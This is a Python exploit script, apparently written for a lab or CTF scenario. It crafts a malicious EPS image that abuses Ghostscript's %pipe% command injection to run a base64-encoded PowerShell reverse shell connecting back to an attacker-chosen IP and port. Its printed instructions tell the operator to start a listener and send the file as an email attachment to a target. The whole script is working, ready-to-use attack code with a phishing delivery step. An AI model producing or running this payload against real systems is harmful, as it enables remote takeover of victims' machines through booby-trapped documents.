import sys
import base64

eps_template = '''%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 300 300
%%Title: Welcome EPS

/Times-Roman findfont
24 scalefont
setfont

newpath
50 200 moveto
(Welcome at vsociety!) show

newpath
30 100 moveto
60 230 lineto
90 100 lineto
stroke
<PAYLOAD>
showpage'''

def help():
    print("USAGE: %s <lip> <lport>" % sys.argv[0])
    exit(1)
    
def next():
    print("[!] open a listener on %s %d." % (ip, port))
    print("    log into mail and reply to Dr Brown's email,")
    print("    attach malicious.eps and send,")
    print("    reverse shell takes a few seconds.")

def craftPayload():
    ps = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    ps = ps % (ip, port)
    ps = "powershell -e " + base64.b64encode(ps.encode('utf16')[2:]).decode()
    print(ps)
    payload = f'(%pipe%{ps}) (w) file /DCTDecode filter'
    print("[+] Payload crafted")
    return payload

def craftEPS():
    with open('malicious.eps', 'wb') as f:
        payload = craftPayload()
        content = eps_template.replace('<PAYLOAD>', payload)
        f.write(content.encode())
    print("[+] EPS crafted")

if __name__ == '__main__':
    try:
        global ip, port
        (ip, port) = (sys.argv[1], int(sys.argv[2]))
        craftEPS()
        next()
    except:
        help()




